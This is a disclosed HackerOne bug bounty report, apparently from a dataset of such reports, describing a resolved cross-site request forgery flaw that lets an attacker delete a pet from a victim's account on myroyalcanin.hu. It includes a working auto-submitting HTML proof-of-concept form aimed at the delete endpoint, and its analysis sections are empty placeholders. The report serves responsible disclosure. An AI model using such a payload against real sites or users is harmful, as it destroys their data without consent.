---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2029753'
original_report_id: '2029753'
title: CSRF to delete a pet
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mars
created_at: '2023-06-17T08:34:06.133Z'
disclosed_at: '2023-08-30T15:47:40.031Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 18
asset_identifier: '*.myroyalcanin.hu'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF to delete a pet

## Metadata

- HackerOne Report ID: 2029753
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mars
- Disclosed At: 2023-08-30T15:47:40.031Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
The ```/kisallataim/ANIMAL_ID/delete``` API endpoint at **myroyalcanin.hu** is vulnerable to Cross-Site Request Forgery attacks.
This vulnerability allows an attacker to delete a pet from the victim's account.

(Sorry for my English, I'm French)

## Proof-of-Concept (PoC)
```html
<html>
  <body>
    <form action="https://myroyalcanin.hu/kisallataim/ANIMAL_ID/delete">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
You have to replace **ANIMAL_ID** with the ID of the victim's pet you wish to delete.

## Impact

An attacker can exploit this CSRF in order to delete the victim's pet.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
